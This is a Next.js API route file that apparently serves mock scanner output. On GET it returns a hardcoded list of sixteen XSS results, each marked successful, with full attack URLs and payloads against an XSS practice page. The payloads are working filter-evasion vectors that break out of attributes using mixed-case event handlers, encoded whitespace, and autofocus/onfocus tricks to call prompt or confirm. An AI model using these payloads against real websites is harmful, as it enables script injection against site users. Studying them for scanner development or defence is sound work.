// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

export default function handler(req, res) {
  
    if (req.method === 'GET') {
        
    const response = [
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p06=\"><A%0aONPOintERenter%0a=%0aa=prompt,a()>v3dm0s",
            "payloads": "\"><A%0aONPOintERenter%0a=%0aa=prompt,a()>v3dm0s"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p06=\"><HTmL%0doNMOUSEoveR%0a=%0aconfirm()//",
            "payloads": "\"><HTmL%0doNMOUSEoveR%0a=%0aconfirm()//"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p06=\"><d3v/+/ONPoinTErenter+=+confirm()>v3dm0s",
            "payloads": "\"><d3v/+/ONPoinTErenter+=+confirm()>v3dm0s"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p06=\"><d3v%0aonPoiNtEREnTer%0a=%0a[8].find(confirm)%0dx>v3dm0s",
            "payloads": "\"><d3v%0aonPoiNtEREnTer%0a=%0a[8].find(confirm)%0dx>v3dm0s"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p07='><htML%09ONMOuSEoVeR+=+a=prompt,a()%0dx>",
            "payloads": "'><htML%09ONMOuSEoVeR+=+a=prompt,a()%0dx>"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p07='><A%0dOnmouseoVeR%0d=%0dconfirm()%0dx>v3dm0s",
            "payloads": "'><A%0dOnmouseoVeR%0d=%0dconfirm()%0dx>v3dm0s"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p07='><a%0dOnmouseOveR%0a=%0a(prompt)``%0dx>v3dm0s",
            "payloads": "'><a%0dOnmouseOveR%0a=%0a(prompt)``%0dx>v3dm0s"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p07='><dETails%0aONPoINtEREnter%09=%09[8].find(confirm)%0dx>",
            "payloads": "'><dETails%0aONPoINtEREnter%09=%09[8].find(confirm)%0dx>"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p08=\"/+/AUtOfOCUs/+/onfOcUs=\"(prompt)``",
            "payloads": "\"/+/AUtOfOCUs/+/onfOcUs=\"(prompt)``"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p08=\"%0daUToFOCUs%0dOnfOcus=\"(confirm)()",
            "payloads": "\"%0daUToFOCUs%0dOnfOcus=\"(confirm)()"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p08=\"%0dAutofOcUS%0donFOcus=\"(prompt)``",
            "payloads": "\"%0dAutofOcUS%0donFOcus=\"(prompt)``"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p08=\"%09AuTofocuS%09ONfoCUs=\"confirm()",
            "payloads": "\"%09AuTofocuS%09ONfoCUs=\"confirm()"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p09='%09AuTOFoCUs%09OnFOcUs='confirm()",
            "payloads": "'%09AuTOFoCUs%09OnFOcUs='confirm()"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p09='/+/aUtofoCus/+/ONfoCuS='a=prompt,a()",
            "payloads": "'/+/aUtofoCus/+/ONfoCuS='a=prompt,a()"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p09='/+/autOfOcUS/+/onfOCUS='(confirm)()",
            "payloads": "'/+/autOfOcUS/+/onfOCUS='(confirm)()"
        },
        {
            "AttackType": "XSS",
            "Success": true,
            "target_url": "https://brutelogic.com.br/gym.php?p09='%0dauTOfOCus%0dONfOCUs='confirm()",
            "payloads": "'%0dauTOfOCus%0dONfOCUs='confirm()"
        }
    ]
       
  
    
  
      res.status(200).json(response)
      
  
  
  
        
  
    }
  
  }
  